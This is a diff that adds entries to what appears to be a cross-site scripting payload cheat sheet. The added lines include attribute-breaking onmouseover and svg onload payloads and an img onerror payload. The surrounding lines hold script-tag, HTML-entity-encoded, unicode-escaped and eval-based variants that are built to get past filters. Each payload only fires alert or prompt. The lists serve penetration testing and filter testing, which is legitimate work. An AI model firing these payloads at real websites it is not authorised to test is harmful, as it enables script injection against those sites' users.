@@ -143,6 +143,10 @@ Spaces < s c r i p t > p r o m t ( 1 ) < / s c r i p t >
 reflected XSS - /?report=javascript
 %3aalert(document.domain)
 
+/login?" onmouseover="alert(document.domain)"
+
+"<svg/onload=alert(document.domain)
+
 php?email='-alert(document.domain)-'
 
 <script>\u0061\u006C\u0065\u0072\u0074(I)</script>
@@ -150,6 +154,8 @@ php?email='-alert(document.domain)-'
 <img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
 
 "><img src=x onerror=prompt(1);>
+
+"><img src=x onerror=alert(document.domain)>
 
 <script>a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);</script>
 
